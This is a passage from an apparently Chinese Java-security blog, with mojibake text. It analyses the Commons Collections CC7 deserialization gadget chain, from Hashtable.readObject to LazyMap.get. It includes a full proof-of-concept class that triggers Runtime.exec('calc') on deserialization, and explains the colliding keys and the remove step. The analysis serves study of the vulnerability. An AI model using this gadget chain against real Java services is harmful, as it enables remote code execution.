alt="image-20240603160438448"></p><p>LazyMapæ˜¯AbstractMapDecoratorçš„å®ç°ç±»åŒæ—¶è¿™äºŒè€…å®ç°Mapæ¥å£ã€‚</p><p>LazyMapä¸­æ²¡æœ‰å®ç°equals()æ–¹æ³•ï¼Œçˆ¶ç±»AbstractMapDecoratorå®ç°äº†equals()æ–¹æ³•</p><p>(å¦‚æœä¸€ä¸ªç±»å®ç°äº†ä¸€ä¸ªæ¥å£ï¼Œé‚£ä¹ˆè¯¥ç±»å¿…é¡»å®ç°æ¥å£ä¸­å£°æ˜çš„æ‰€æœ‰æ–¹æ³•ï¼Œå¦‚æœä¸€ä¸ªæŠ½è±¡ç±»å®ç°äº†ä¸€ä¸ªæ¥å£ï¼Œå®ƒå¯ä»¥é€‰æ‹©ä¸å®ç°æ¥å£çš„æ‰€æœ‰æ–¹æ³•ï¼Œè€ŒæŠŠå®ç°çš„è´£ä»»äº¤ç»™å®ƒçš„å…·ä½“å­ç±»)</p><h2 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h2><p>çŒœæƒ³ä½œè€…æ˜¯å—äº†CC6çš„å¯å‘ï¼Œæ—¢ç„¶HashMapèƒ½å®ç°ååºåˆ—åŒ–æ¼æ´ï¼Œé‚£HashTableæ˜¯å¦ä¹Ÿå¯ä»¥ï¼Ÿæœ€ç»ˆæ˜¯å½¢æˆäº†CC7è¿™æ¡é“¾ã€‚</p><hr><p><code>Hashtable</code>çš„<code>readObject()</code>è°ƒç”¨äº†<code>reconstitutionPut()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">  table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;?,?&gt;[length];<br>        threshold = (<span class="hljs-type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="hljs-number">1</span>);<br>        count = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br>        <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();<br>            <span class="hljs-comment">// synch could be eliminated for performance</span><br>            reconstitutionPut(table, key, value);<br>            <br>é¦–å…ˆåˆ›å»ºä¸€ä¸ªEntryï¼Œè¿™æ˜¯ä¸Šæ–‡è®²åˆ°çš„æ•£åˆ—è¡¨ä¸­çš„é‚£ä¸ªæ•°ç»„ã€‚<br>sæ˜¯æˆ‘ä»¬ä¼ å…¥çš„è¾“å…¥æµ<br>ç„¶åè¿›å…¥<span class="hljs-keyword">for</span>å¾ªç¯ååºåˆ—åŒ–èµ‹å€¼ç»™ key,valueï¼Œç„¶åè°ƒç”¨reconstitutionPutæ–¹æ³•ã€‚<br></code></pre></td></tr></table></figure><p><img src="https://image.sp4rks.xyz/2024/06/image-20240603155212582.png" alt="image-20240603155212582"></p><p>ç»§ç»­è·Ÿè¿› <code>reconstitutionPut()</code> æ–¹æ³•ï¼Œä¹‹åæˆ‘ä»¬çœ‹åˆ° <code>reconstitutionPut()</code> æ–¹æ³•è°ƒç”¨äº† <code>equals()</code> æ–¹æ³•â€”-<code>e.key.equals(key)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br>        <span class="hljs-keyword">throws</span> StreamCorruptedException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>        <br><span class="hljs-comment">//é€šè¿‡keyè®¡ç®—ä¸€ä¸ªhashå€¼ï¼Œç”¨è¿™ä¸ªå€¼è¿›è¡Œè®¡ç®—å¾—åˆ°indexã€‚è¿™ä¸ªindexå°±æ˜¯å‰é¢åˆ›å»ºçš„Entryæ•°ç»„çš„ç´¢å¼•ã€‚</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>     <br><span class="hljs-comment">//æ¯”è¾ƒå“ˆå¸Œå€¼e.hashæ˜¯å¦ä¸æ–°é”®çš„å“ˆå¸Œå€¼hashç›¸ç­‰ã€‚å¦‚æœå“ˆå¸Œå€¼ç›¸ç­‰ï¼Œå†æ¯”è¾ƒé”® e.key æ˜¯å¦ä¸æ–°é”® key ç›¸ç­‰ã€‚å¦‚æœä¸¤ä¸ªæ¡ä»¶éƒ½æ»¡è¶³ï¼Œåˆ™è¡¨ç¤ºå“ˆå¸Œè¡¨ä¸­å·²å­˜åœ¨ç›¸åŒçš„é”®ï¼ŒæŠ›å‡º StreamCorruptedException å¼‚å¸¸ã€‚</span><br>        <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>        count++;<br><br>e.key.equals(key)å…¶ä¸­ä¸¤ä¸ªkeyæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ<br>e.keyï¼šè¿™æ˜¯å½“å‰å“ˆå¸Œè¡¨ï¼ˆtableï¼‰ä¸­æŸä¸ªä½ç½®ï¼ˆindexï¼‰å·²å­˜åœ¨çš„é”®ã€‚eæ˜¯ä¸€ä¸ª Entry å¯¹è±¡ï¼Œè¡¨ç¤ºå“ˆå¸Œè¡¨ä¸­ä¸€ä¸ªæ§½ä½çš„é“¾è¡¨ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ã€‚æ‰€ä»¥ï¼Œe.key æ˜¯å·²ç»å­˜å‚¨åœ¨å“ˆå¸Œè¡¨ä¸­çš„é”®ã€‚<br>keyï¼šè¿™æ˜¯ä»ååºåˆ—åŒ–è¾“å…¥æµï¼ˆObjectInputStreamï¼‰ä¸­è¯»å–çš„æ–°é”®ã€‚è¿™ä¸ªé”®æ˜¯åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä»æµä¸­è¯»å–çš„ï¼Œå¹¶ä¸”éœ€è¦æ’å…¥åˆ°å“ˆå¸Œè¡¨ä¸­ã€‚<br><br>å…¶ä¸­e.keyå¯æ§ï¼Œæ˜¯å› ä¸ºåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œé”®å’Œå€¼æ˜¯ç›´æ¥ä»è¾“å…¥æµä¸­è¯»å–çš„<br></code></pre></td></tr></table></figure><p><img src="https://image.sp4rks.xyz/2024/06/image-20240603155307188.png" alt="image-20240603155307188"></p><p>æ‰€ä»¥è¦çœ‹ä¸€ä¸‹å“ªé‡Œæœ‰<code>equals()</code> è¿™ä¸ªæ–¹æ³•ï¼Œæ‰¾åˆ°äº† <code>AbstractMapDecorator</code> è¿™ä¸ªç±»ä¸­å¯¹mapè°ƒç”¨äº†equals()æ–¹æ³•ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240603155442086.png" alt="image-20240603155442086"></p><p><code>return map.equals(object)</code>ä¸­mapæ˜¯ä»€ä¹ˆï¼Ÿè¿™é‡Œåªæ˜¯<code>AbstractMapDecorator</code> ä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>map</code> çš„å­—æ®µï¼Œå­˜å‚¨å¯¹å¦ä¸€ä¸ª <code>Map</code> å¯¹è±¡çš„å¼•ç”¨ã€‚</p><p>è¿™ä¸ªç±»æ˜¯ç»§æ‰¿äº† Map æ¥å£ï¼Œä½†æ˜¯ Map æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæˆ‘ä»¬éœ€è¦å»æ‰¾ Map çš„å®ç°ç±»ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240604160438813.png" alt="image-20240604160438813"></p><p>ä¸Šé¢æœ€å¼€å§‹å°±è¯´äº†AbstractMapå®ç°äº†Mapæ¥å£ï¼Œå¹¶ä¸”å®ç°äº†equals()æ–¹æ³•</p><p>å¯ä»¥çœ‹è§æœ€ç»ˆè°ƒç”¨äº†<code>m.get()</code>æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯å¦‚æœ<code>m</code>å¯æ§ï¼Œåˆ™å¯ä»¥å®Œæˆè°ƒç”¨<code>LazyMap.get()</code>æ–¹æ³•è§¦å‘å‘½ä»¤æ‰§è¡Œã€‚åœ¨è¿™é‡Œï¼Œ<code>m</code>ç”±ä¼ è¿›æ¥çš„å‚æ•°<code>o</code>æ§åˆ¶ï¼Œä¹Ÿå°±æ˜¯æœ€åˆçš„<code>key</code>ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240604160036081.png" alt="image-20240604160036081"></p><p>è°ƒç”¨é“¾</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.readObject</span><br>    java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.reconstitutionPut</span><br>    org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.AbstractMapDecorator</span><span class="hljs-selector-class">.equals</span><br>    java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.AbstractMap</span><span class="hljs-selector-class">.equals</span><br>    org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span>.get<br></code></pre></td></tr></table></figure><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; hashMap2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">LazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        decorateMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">LazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        decorateMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(LazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(LazyMap2, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer, transformers);<br>        decorateMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªHashMap"><a href="#ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªHashMap" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªHashMap"></a>ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªHashMap</h3><p>å¦‚æœä¸¤ä¸ªhashmapç›¸åŒçš„è¯ä¼šç›´æ¥åœ¨<code>hashtable.put()</code>çš„æ—¶å€™è®¤ä¸ºæ˜¯ä¸€ä¸ªå…ƒç´ ï¼Œæ‰€ä»¥ä¹‹åå°±ä¸ä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘equalsä»£ç </p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240604202356973.png" alt="image-20240604202356973"></p><h3 id="ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªLazyMap"><a href="#ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªLazyMap" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªLazyMap"></a>ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªLazyMap</h3><p>é¦–å…ˆçœ‹<code>HashTable.put</code>ï¼Œè¿™é‡Œå’Œ<code>reconstitutionPut</code>å¤„çš„ä»£ç ç±»ä¼¼ï¼Œéƒ½åŒ…å«äº†<code>*.key.equals(key))</code>ä»£ç ã€‚å…¶ä¸­<code>key</code>æ˜¯ä¼ å…¥çš„<code>LazyMap</code>ï¼Œ<code>tab</code>æ˜¯å…¨å±€çš„ä¸€ä¸ª<code>Entry</code>ï¼Œæ ¹æ®<code>hashcode</code>ç®—å‡ºä¸€ä¸ª<code>index</code>ï¼Œåªæœ‰<code>entry</code>ä¸­æœ‰å…ƒç´ æ‰ä¼šè¿›å…¥<code>for</code>å¾ªç¯ï¼Œä»è€Œè¿›ä¸€æ­¥è§¦å‘</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240604205642784.png" alt="image-20240604205642784"></p><p>æ‰€ä»¥å¯ä»¥çœ‹å‡ºï¼Œå¿…é¡»è¦ä¸¤ä¸ªæˆ–ä»¥ä¸Šå…ƒç´ æ‰èƒ½è¿›å…¥<code>entry.key.equals(key))</code>æ–¹æ³•ã€‚ç±»ä¼¼åœ°ï¼Œååºåˆ—åŒ–çš„è§¦å‘ç‚¹<code>reconstitutionPut</code>å¤„ä¹Ÿæ˜¯è¿™æ ·çš„é€»è¾‘ï¼Œéœ€è¦ä¿è¯å¿…é¡»æœ‰ä¸¤ä¸ªæˆ–ä»¥ä¸Šå…ƒç´ </p><p>è¿›è€Œå¯ä»¥å¾—å‡ºçš„ç»“è®ºï¼Œèƒ½èµ°åˆ°<code>LazyMap.get</code>æ–¹æ³•çš„åªæœ‰<code>lazyMap2</code>è¿™ä¸€ä¸ªå¯¹è±¡</p><h3 id="ä¸ºä»€ä¹ˆé€‰æ‹©zZå’Œyyä½œä¸ºkey"><a href="#ä¸ºä»€ä¹ˆé€‰æ‹©zZå’Œyyä½œä¸ºkey" class="headerlink" title="ä¸ºä»€ä¹ˆé€‰æ‹©zZå’Œyyä½œä¸ºkey"></a>ä¸ºä»€ä¹ˆé€‰æ‹©zZå’Œyyä½œä¸ºkey</h3><p>ifä¸­çš„ç¬¬ä¸€ä¸ªæ¡ä»¶å°±æ˜¯<code>e.hash == hash</code>ï¼Œæ„æ€å°±æ˜¯ä¸¤ä¸ªkeyçš„hashå¿…é¡»ç›¸åŒã€‚é‚£ä¸ºä»€ä¹ˆä¸æŠŠä¸¤ä¸ªkeyè®¾æˆä¸€æ ·çš„å‘¢ï¼Ÿè¿™æ ·ä¸¤ä¸ªkeyçš„hashç»å¯¹ç›¸ç­‰çš„å•Šã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240604204417711.png" alt="image-20240604204417711"></p><p>ä½†æ˜¯å¦‚æœç»§ç»­å¾€ä¸‹è·Ÿä»£ç çš„è¯å°±ä¼šå‘ç°åœ¨<code>lazymap</code>çš„getæ–¹æ³•ä¸­æœ‰ä»¥ä¸‹é€»è¾‘ï¼Œmapçš„keyä¸èƒ½é‡å¤å¦åˆ™å°±ä¸ä¼šæ‰§è¡Œ<code>transform</code>å‡½æ•°æ‰§è¡Œä»£ç äº†ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240604204650378.png" alt="image-20240604204650378"></p><h3 id="ä¸ºä»€ä¹ˆHashtableéœ€è¦-put-ä¸¤æ¬¡"><a href="#ä¸ºä»€ä¹ˆHashtableéœ€è¦-put-ä¸¤æ¬¡" class="headerlink" title="ä¸ºä»€ä¹ˆHashtableéœ€è¦ put ä¸¤æ¬¡"></a>ä¸ºä»€ä¹ˆHashtableéœ€è¦ put ä¸¤æ¬¡</h3><p>åœ¨<code>Hashtable.reconstitutionPut()</code>æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€æ¬¡è¿›å…¥æ—¶<code>tab</code>å†…å®¹ä¸ºç©ºï¼Œæ— æ³•è¿›å…¥ for å¾ªç¯ï¼Œè¿›è€Œæ²¡æ³•è°ƒç”¨åˆ°<code>key.equals()</code>æ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240604203934450.png" alt="image-20240604203934450"></p><p>ä¸ºäº†è°ƒç”¨ä¸¤æ¬¡<code>reconstitutionPut()</code>æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡<code>put()</code>ä¸¤æ¬¡å†…å®¹ï¼Œä½¿å¾—<code> elements</code>çš„å€¼ä¸º2ï¼Œè¿›è€Œåœ¨ for å¾ªç¯é‡Œè¿è¡Œä¸¤æ¬¡<code>reconstitutionPut()</code>æ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240604204034934.png" alt="image-20240604204034934"></p><h3 id="ä¸ºä»€ä¹ˆè¦ç§»é™¤ç¬¬äºŒä¸ªLazyMapä¸­çš„å…ƒç´ "><a href="#ä¸ºä»€ä¹ˆè¦ç§»é™¤ç¬¬äºŒä¸ªLazyMapä¸­çš„å…ƒç´ " class="headerlink" title="ä¸ºä»€ä¹ˆè¦ç§»é™¤ç¬¬äºŒä¸ªLazyMapä¸­çš„å…ƒç´ "></a>ä¸ºä»€ä¹ˆè¦ç§»é™¤ç¬¬äºŒä¸ªLazyMapä¸­çš„å…ƒç´ </h3><ul><li>ä¸ºä»€ä¹ˆæœ€åè¦<code>remove(&quot;yy&quot;)</code></li></ul><p>é—®é¢˜åœ¨<code>AbstractMap.equals()</code>æ–¹æ³•é‡Œï¼Œ<code>size()</code>çš„å€¼ä¸º 1ï¼Œè€Œ<code>m.size()</code>çš„å€¼ä¸º 2ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦<code>remove</code>æ‰ä¸€ä¸ªä½¿å…¶ç›¸ç­‰</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240604210421463.png" alt="image-20240604210421463"></p><ul><li>ä¸ºä»€ä¹ˆæ˜¯<code>lazyMap2.remove(&quot;yy&quot;);</code>ï¼Ÿ</li></ul><p>åœ¨<code>Hashtable.put()</code>æ–¹æ³•æ—¶ä¹Ÿä¼šè°ƒç”¨ä¸€æ¬¡<code>entry.key.equals(key)</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240604210702264.png" alt="image-20240604210702264"></p><p>å› æ­¤åœ¨<code>hashtable.put(decorateMap2, 2);</code>ä¹‹åè·Ÿåˆ°<code>AbstractMap().equals()</code>æ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240604221340356.png" alt="image-20240604221340356"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œä¼ å…¥<code>LazyMap.get(key)</code>ä¸­çš„ key ä¸º<code>yy</code>ï¼Œç»§ç»­è·Ÿè¿›<code>LazyMap.get()</code>æ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240604212136853.png" alt="image-20240604212136853"></p><p>æœ€åå› ä¸º<code>lazyMap2</code>ä¸­å¹¶æ²¡æœ‰<code>yy</code>è¿™ä¸ª<code>key</code>ï¼Œå› æ­¤ä¼šæ‰§è¡Œä¸€ä¸ª<code>map.put(&quot;yy&quot;,&quot;yy&quot;)</code>çš„æ“ä½œæ·»åŠ ï¼Œæ‰€ä»¥åœ¨ POC ä¸­ï¼Œæˆ‘ä»¬æœ€åè¦æŠŠ<code>lazyMap2</code>çš„<code>yy</code>ç»™åˆ é™¤æ‰ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.anquanke.com/post/id/240040">ysoserial CommonsCollections7 &amp; C3P0 è¯¦ç»†åˆ†æ</a>)</p><p><a href="https://www.anquanke.com/post/id/248169">CCç¬¬7é“¾HashTableè§¦å‘ç‚¹æ·±å…¥åˆ†æ</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/12427015.html">javaååºåˆ—åŒ–-ysoserial-è°ƒè¯•åˆ†ææ€»ç»“ç¯‡(7)</a></p><p><a href="http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE">JAVAååºåˆ—åŒ–ä¹‹CommonCollections7åˆ©ç”¨é“¾</a></p><p><a href="https://github.com/dota-st/JavaSec/blob/master/03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/8-CommonsCollections7/CommonsCollections7.md">CommonsCollections7åˆ©ç”¨é“¾åˆ†æ</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC5</title>
    <link href="/2024/06/02/JAVA%E5%AE%89%E5%85%A8/CC5/"/>
    <url>/2024/06/02/JAVA%E5%AE%89%E5%85%A8/CC5/</url>
    
